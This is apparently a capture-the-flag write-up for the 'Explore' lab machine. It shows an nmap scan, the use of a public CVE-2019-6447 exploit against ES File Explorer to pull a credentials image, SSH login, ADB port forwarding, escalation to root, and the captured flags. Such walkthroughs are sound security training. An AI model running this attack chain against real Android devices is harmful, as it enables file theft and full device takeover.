# Explore

Android system bug at ES file explore, and use adb to hack the port to get root privilege

## Ifconfig

```
inet 10.10.14.46  netmask 255.255.254.0
inet6 fe80::4d6f:8a37:ee37:6175 
```

## Nmap

> sudo nmap -sC -sV -A 10.10.10.247 | tee [nmap.log](./nmap.log)

Found http 42135 *(ES file explorer)* and 59777 *(minecraft server)* port

## ES file explorer exploit

- Due to [CVE-2019-6447](https://www.cvedetails.com/cve/CVE-2019-6447/)

```
The ES File Explorer File Manager application through 4.1.9.7.4 for Android allows remote attackers to read arbitrary files or execute applications via TCP port 59777 requests on the local Wi-Fi network. This TCP port remains open after the ES application has been launched once, and responds to unauthenticated application/json data over HTTP.
Publish Date : 2019-01-16 Last Update Date : 2021-06-29 
```

- Use [exploit tools](https://www.exploit-db.com/exploits/50070)

> python [esexploit.py](./esexploit.py) listPics 10.10.10.247

```
==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

name : concept.jpg
time : 4/21/21 02:38:08 AM
location : /storage/emulated/0/DCIM/concept.jpg
size : 135.33 KB (138,573 Bytes)

name : anc.png
time : 4/21/21 02:37:50 AM
location : /storage/emulated/0/DCIM/anc.png
size : 6.24 KB (6,392 Bytes)

name : creds.jpg
time : 4/21/21 02:38:18 AM
location : /storage/emulated/0/DCIM/creds.jpg
size : 1.14 MB (1,200,401 Bytes)

name : 224_anc.png
time : 4/21/21 02:37:21 AM
location : /storage/emulated/0/DCIM/224_anc.png
size : 124.88 KB (127,876 Bytes)
```

> python [esexploit.py](./esexploit.py) getFile 10.10.10.247 [/storage/emulated/0/DCIM/creds.jpg](./exploited/creds.jpg)

```
username: kristi
password: Kr1sT!5h@Rp3xPl0r3!
```

## ssh

- Android open ssh port at 2222

> ssh kristi@10.10.10.247 -p 2222

> whoami

```
u0_a76
```

> cd /sdcard

```
user.txt
f32017174c7c7e8f50c6da52891ae250
```

- Export the port 5555 to localhost

> ssh kristi@10.10.10.247 -p 2222 -L 5555:localhost:5555

And then use adb(Android debug bridge) to connect port 5555 of localhost

> adb connect localhost:5555

```
connected to localhost:5555
```

> adb devices -l

```
List of devices attached
localhost:5555         device product:android_x86_64 model:VMware_Virtual_Platform device:x86_64 transport_id:2
```

- Use adb shell to the serial connect

> adb -s localhost:5555 shell

> whoami

```
shell
```

> su

> whoami

```
root
```

- Find root.txt file

> find / -name root.txt 2> /dev/null

```
/data/root.txt

f04fc82b6d49b41c9b08982be59338c5
```
